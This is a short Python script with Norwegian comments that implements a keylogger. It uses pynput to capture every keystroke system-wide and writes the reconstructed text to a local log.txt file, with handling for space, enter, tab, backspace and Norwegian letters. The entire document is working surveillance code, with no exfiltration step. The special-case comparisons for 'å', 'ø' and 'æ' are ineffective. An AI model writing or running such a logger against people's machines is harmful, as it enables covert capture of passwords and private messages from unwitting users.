# -*- coding: utf-8 -*-

from pynput.keyboard import Listener, Key

log_text = ""  # Lagre de logiske tastene

def write_to_file(key):
    global log_text

    if hasattr(key, 'char'):  # Hvis tasten har en karakterattributt
        letter = key.char
    else:
        letter = str(key)

    if key == Key.space:
        letter = ' '
    elif key == Key.shift_r or key == Key.shift:
        letter = ''
    elif key == Key.ctrl_l:
        letter = ''
    elif key == Key.enter:
        letter = '\n'
    elif key == Key.tab:
        letter = '\t'
    elif key == Key.backspace:
        # Fjern siste tegn fra log_text ved backspace, og oppdater log.txt
        log_text = log_text[:-1]
        update_log_file()
        return
    elif key == Key.esc:
        letter = '[ESC]'
    elif key == 'å':
        letter = 'å'
    elif key == 'ø':
        letter = 'ø'
    elif key == 'æ':
        letter = 'æ'
    else:
        # Behandle andre taster som vanlig
        letter = letter.replace("'", "")

    log_text += letter  # Legg til karakter i log_text
    update_log_file()

def update_log_file():
    with open("log.txt", 'w', encoding='utf-8') as f:
        f.write(log_text)

# Samler hendelser til det stoppes
with Listener(on_press=write_to_file) as l:
    l.join()
